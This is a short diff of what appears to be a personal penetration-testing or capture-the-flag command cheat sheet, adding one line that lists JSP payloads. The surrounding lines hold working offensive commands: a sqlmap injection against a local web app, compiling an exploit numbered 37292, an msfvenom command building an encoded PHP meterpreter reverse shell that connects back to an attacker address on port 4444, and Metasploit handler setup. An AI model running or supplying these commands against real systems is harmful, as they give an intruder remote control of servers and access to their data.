@@ -14,6 +14,8 @@ sqlmap -u "http://192.168.0.107/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D
 python3 -m http.server 8000 --bind 0.0.0.0
 gcc 37292.c -o hack
 sort fsocity.dic | uniq -u > f.dic
+
+msfvenom --list payload | grep jsp
 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4444 -e php/base64 -f raw > file.php
   use exploit/multi/handler
     set payload php/meterpreter/reverse_tcp
